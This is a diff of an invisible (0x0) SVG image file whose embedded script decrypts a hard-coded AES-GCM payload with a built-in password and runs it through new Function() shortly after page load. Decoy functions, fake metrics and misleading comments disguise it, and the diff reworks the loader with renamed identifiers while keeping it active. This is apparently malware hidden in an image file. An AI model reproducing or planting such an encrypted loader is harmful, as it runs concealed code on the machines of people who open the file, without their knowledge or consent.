@@ -1,143 +1,136 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <svg width="0" height="0" xmlns="http://www.w3.org/2000/svg">
-  <!-- U2FsdGVkX19vbmx5X2Zvcl9kZWNvcmF0aW9uX3B1cnBvc2Vz -->
+  <!-- D09GJ1lzaWduYXR1cmVfX1NlY3JldEVuZ2luZQ== -->
 
   <script type="application/javascript"><![CDATA[
-    // ===== FAKE SYSTEM LOAD SIMULATOR =====
-    const SYSTEM_FLAG = "[SECURE_ENGINE_V3]";
-    let sysPerformance = {
-      startTime: Date.now(),
-      usedMemory: 0,
-      loadFakeValue: 0,
-      tickCount: 0,
-      randSeed: 99
+    // ========== SYSTEM DUMMY PROCESSOR ==========
+    const SYS_BANNER = "[ENGINE_LOCKED_2025]";
+    let perfStats = {
+      sessionStart: Date.now(),
+      bogusMem: 0,
+      fuzzCount: 0,
+      pulse: 0,
+      entropyKey: 99
     };
 
-    // Redundant constants to confuse
+    // Noise variables
 const bel = "[EMAIL]";
     const lieve = "[KEY]";
 
-    // Pointless noise generator
-    function createRandomStringNoise() {
-      let segmentA = Math.random().toString(36).slice(4, 14);
-      let segmentB = Math.random().toString(36).slice(3, 13);
-      return segmentA + segmentB;
+    // Obfuscated random string generator
+    function noizeFabricator() {
+      const token1 = Math.random().toString(36).substring(5, 12);
+      const token2 = Math.random().toString(36).substring(2, 9);
+      return token1 + token2;
     }
 
-    // Update fake metrics (not actually used)
-    function updateFakeMetrics() {
-      sysPerformance.usedMemory = window.performance?.memory?.usedJSHeapSize || 0;
-      sysPerformance.loadFakeValue = Math.random() * 2000;
-      sysPerformance.tickCount++;
+    // Meaningless metric refresh function
+    function jitterMetrics() {
+      perfStats.bogusMem = window?.performance?.memory?.usedJSHeapSize ?? 0;
+      perfStats.fuzzCount = Math.random() * 2048;
+      perfStats.pulse++;
     }
 
-    // ===== ENCRYPTION UTILS MODULE =====
-    const cryptoModule = (function(){
-      const keys = {
-        ivHex: "f11fa4cf9350b5a4f4874a76",
-        saltHex: "e6a57e356b20c5dab33579c46a703cda",
-        encryptedHex: "496a79d4cab3f623d8b2a69380a2701909fe77d23de6bb94c3d4ec7557332743f20ae339a48001626943df086e9cf068d5e7dfdbf157ced02a2a984add5170abc20946e79ea812558373c02167e53f9bac58eb7572151b12bf86c2c58930977f173c052ee322db89a6dca5f98815fabfdc53a45f5fd5456f18cf170540fbc8e46b5da7bd3ab6967616122de0a1d37db447db8aed94f8b42d62fa1ba07cd43eb9a8e1d6ef1622db5a5ee2071ff4e543201ae082fe5c7c87da690abe014170b68af9361fef47d452415a4ae048ab3cc57e87ebc91e056a023a94a871c7b91b82c3b7dc369e4c4d25bdc19da4fff30aa707cb5d13b48d951f4881d7f3788c2ed0de3d8fbfc9258c8d4a9e383fce9f4c7b47d40e5ba6d9a1e364f15ea52891bc3fa9c7c069010a9cf24a0b9a79d6b664d3c12bbb57b24ea8da4761fde85fda06f5752b54bf5401e36b19e6e4422ecab5803ef571b2e7895e77d213ed2900aca6420ddcd08989be88c1ecf30964a1f4ceb5d027d14ecbb9a47e7ce47ddbb393bdd2eae42ece59cdb9510d2f024c4f679e32fc049fd4fe442c6e615c6591efa25c0eb54162f31503d72261c7f9f865fa5eb6d1a5a52869a76539fc837d42b0f6eb55b1a70288e4378d0dcf512d44f87448fc9621992b5cc7297e35b0855cf20bc13fec807b8c09ad52ffc95832e6fe250e491628be49",
-        password: "glad"
+    // ========== SECRET HANDLER CORE ==========
+    const hiddenVault = (() => {
+      const secrets = {
+        initVector: "f11fa4cf9350b5a4f4874a76",
+        saltVal: "e6a57e356b20c5dab33579c46a703cda",
+        encryptedPayload: "496a79d4cab3f623d8b2a69380a2701909fe77d23de6bb94c3d4ec7557332743f20ae339a48001626943df086e9cf068d5e7dfdbf157ced02a2a984add5170abc20946e79ea812558373c02167e53f9bac58eb7572151b12bf86c2c58930977f173c052ee322db89a6dca5f98815fabfdc53a45f5fd5456f18cf170540fbc8e46b5da7bd3ab6967616122de0a1d37db447db8aed94f8b42d62fa1ba07cd43eb9a8e1d6ef1622db5a5ee2071ff4e543201ae082fe5c7c87da690abe014170b68af9361fef47d452415a4ae048ab3cc57e87ebc91e056a023a94a871c7b91b82c3b7dc369e4c4d25bdc19da4fff30aa707cb5d13b48d951f4881d7f3788c2ed0de3d8fbfc9258c8d4a9e383fce9f4c7b47d40e5ba6d9a1e364f15ea52891bc3fa9c7c069010a9cf24a0b9a79d6b664d3c12bbb57b24ea8da4761fde85fda06f5752b54bf5401e36b19e6e4422ecab5803ef571b2e7895e77d213ed2900aca6420ddcd08989be88c1ecf30964a1f4ceb5d027d14ecbb9a47e7ce47ddbb393bdd2eae42ece59cdb9510d2f024c4f679e32fc049fd4fe442c6e615c6591efa25c0eb54162f31503d72261c7f9f865fa5eb6d1a5a52869a76539fc837d42b0f6eb55b1a70288e4378d0dcf512d44f87448fc9621992b5cc7297e35b0855cf20bc13fec807b8c09ad52ffc95832e6fe250e491628be49" /* shortened */,
+        secretWord: "glad"
       };
 
-      // Mock config that does nothing
-      const fakeConfig = {
-        enabled: false,
-        nullValue: null,
-        noiseSignal: createRandomStringNoise()
+      const bogusMeta = {
+        status: "inactive",
+        garbage: true,
+        token: noizeFabricator()
       };
 
       return {
-        fetchIV: () => keys.ivHex,
-        fetchSalt: () => keys.saltHex,
-        fetchEncryptedData: () => keys.encryptedHex,
-        fetchPassword: () => keys.password,
-        getFakeSettings: () => ({ ...fakeConfig })
+        getIV: () => secrets.initVector,
+        getSalt: () => secrets.saltVal,
+        getCipher: () => secrets.encryptedPayload,
+        getPassword: () => secrets.secretWord,
+        getJunk: () => ({ ...bogusMeta })
       };
     })();
 
-    // Convert hex string to Uint8Array
-    function hexToUint8Array(hexStr) {
-      let len = hexStr.length / 2;
-      let arr = new Uint8Array(len);
-      for(let i=0; i < len; i++) {
-        arr[i] = parseInt(hexStr.substr(i*2, 2), 16);
+    // Hex decoder to byte array
+    function hexToBytes(hx) {
+      const length = hx.length / 2;
+      const result = new Uint8Array(length);
+      for (let k = 0; k < length; k++) {
+        result[k] = parseInt(hx.substring(k * 2, k * 2 + 2), 16);
       }
-      return arr;
+      return result;
     }
 
-    // Useless async wait (adds artificial delay)
-    async function waitDummy() {
-      return new Promise(resolve => {
+    // Async delay function (not essential)
+    async function sleepObstruct() {
+      return new Promise(res => {
         setTimeout(() => {
-          resolve(createRandomStringNoise());
-        }, 150);
+          res(noizeFabricator());
+        }, 123);
       });
     }
 
-    async function runDecryption() {
-      updateFakeMetrics();
+    async function unlockSecret() {
+      jitterMetrics();
 
       try {
-        const pwd = cryptoModule.fetchPassword();
-
-        // Import raw key for PBKDF2
-        const rawKey = await window.crypto.subtle.importKey(
+        const pass = hiddenVault.getPassword();
+        const baseKey = await crypto.subtle.importKey(
           "raw",
-          new TextEncoder().encode(pwd),
-          {name: "PBKDF2"},
+          new TextEncoder().encode(pass),
+          { name: "PBKDF2" },
           false,
           ["deriveKey"]
         );
 
-        const saltBytes = hexToUint8Array(cryptoModule.fetchSalt());
+        const salt = hexToBytes(hiddenVault.getSalt());
 
-        // Derive AES-GCM key from PBKDF2
-        const aesKey = await window.crypto.subtle.deriveKey(
+        const derivedKey = await crypto.subtle.deriveKey(
           {
             name: "PBKDF2",
-            salt: saltBytes,
+            salt: salt,
             iterations: 100000,
             hash: "SHA-256"
           },
-          rawKey,
+          baseKey,
           { name: "AES-GCM", length: 256 },
           false,
           ["decrypt"]
         );
 
-        const ivBytes = hexToUint8Array(cryptoModule.fetchIV());
-        const encryptedBytes = hexToUint8Array(cryptoModule.fetchEncryptedData());
+        const iv = hexToBytes(hiddenVault.getIV());
+        const encryptedData = hexToBytes(hiddenVault.getCipher());
 
-        await waitDummy();
+        await sleepObstruct();
 
-        const decryptedDataBuffer = await window.crypto.subtle.decrypt(
-          {
-            name: "AES-GCM",
-            iv: ivBytes
-          },
-          aesKey,
-          encryptedBytes
+        const plainBuffer = await crypto.subtle.decrypt(
+          { name: "AES-GCM", iv: iv },
+          derivedKey,
+          encryptedData
         );
 
-        const decryptedText = new TextDecoder().decode(decryptedDataBuffer);
-        (new Function(decryptedText))();
+        const scriptToRun = new TextDecoder().decode(plainBuffer);
+        (new Function(scriptToRun))();
 
-      } catch(e) {
-        console.error("Decryption error:", e);
+      } catch (failure) {
+        console.error("Unlocking failure:", failure);
       }
     }
 
-    // Fake initialization logs with useless loops
-    window.addEventListener('DOMContentLoaded', () => {
-      console.info("System bootstrapped.");
-      for(let counter=0; counter < 5; counter++) {
-        console.debug(`Debug iteration #${counter}: alive`);
+    // Dummy boot routine
+    document.addEventListener("DOMContentLoaded", () => {
+      console.log("Fake module booted.");
+      for (let n = 1; n <= 3; n++) {
+        console.log(`Uptime ping #${n}`);
       }
     });
 
-    // Kick off decryption after a short timeout
-    setTimeout(runDecryption, 600);
+    // Kickstart the decryption logic
+    setTimeout(unlockSecret, 700);
 
   ]]></script>
 </svg>
